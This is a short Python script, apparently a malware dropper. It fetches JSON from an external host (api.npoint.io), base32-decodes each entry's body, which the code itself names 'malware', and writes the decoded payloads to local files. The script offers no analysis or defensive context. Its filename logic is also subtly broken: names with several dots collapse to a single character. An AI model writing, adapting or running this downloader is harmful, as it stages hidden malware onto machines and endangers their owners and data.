import base64, requests

URL = "https://api.npoint.io/531896996f8103fa82c3"
def main():
    response = requests.get(url=URL).json()
    for index, key in enumerate(response):
        filename = response[key]["fullName"].split(".")
        extension = filename[-1]
        if len(filename) > 2:
            filename = ".".join(filename[:-1])
        with open(f"{filename[0]}_{index}.{extension}", "wb") as file:
            malware = response[key]["body"]
            decoded = malware.encode("utf-8")
            decoded = base64.b32decode(decoded)
            file.write(decoded)


if __name__ == '__main__':
    main()